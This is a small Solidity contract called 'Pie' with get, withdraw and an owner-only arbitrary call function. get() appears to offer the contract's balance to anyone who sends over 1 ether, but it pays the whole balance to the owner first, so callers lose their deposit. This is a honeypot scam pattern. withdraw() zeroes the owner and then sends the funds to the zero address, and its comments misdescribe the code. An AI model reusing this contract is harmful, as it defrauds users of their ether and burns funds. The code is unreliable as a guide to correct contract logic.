pragma solidity ^0.4.19;

contract Pie {
    address public owner;

    function Pie() public {
        owner = msg.sender;
    }

    function() public payable {}

    function get() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner = 0; // Remove the hardcoded address
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0)); // Check if the address is valid
        require(data.length > 0); // Check if data is not empty
        require(adr.call.value(msg.value)(data)); // Check if the low level call was successful
    }
}